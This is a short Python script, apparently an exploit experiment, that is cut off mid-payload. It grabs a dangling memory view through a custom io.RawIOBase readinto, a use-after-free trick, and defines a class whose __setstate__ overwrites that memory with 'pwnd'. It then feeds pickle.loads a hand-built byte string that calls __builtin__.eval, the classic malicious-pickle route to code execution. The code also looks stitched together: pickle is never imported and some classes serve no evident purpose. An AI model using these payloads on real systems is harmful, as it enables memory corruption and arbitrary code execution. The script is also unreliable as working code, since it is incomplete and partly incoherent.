import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f
del File

class Picklar:
    def __init__(self, o):
        self.o = o
    def __getstate__(self):
        return id(self.o)
    @staticmethod
    def __setstate__(state):
        global flag
        flag = view
        view[:] = b'pwnd'

class Base:
    def __init__(self, i):
        self.i = i

class Derived(Base):
    def __init__(self, i, name, age):
        Base.__init__(self, i)
        self.name = name
        self.age = age

d = Derived(0, 'hackability', 2)
d2 = Derived(1, 'ha4k4b1l1ty', 3)
d_pickle = pickle.dumps(d)
d2_pickle = pickle.dumps(d2)
pickle.loads(b"c__builtin__\neval\nq\x00(c__main__\nPicklar\nq
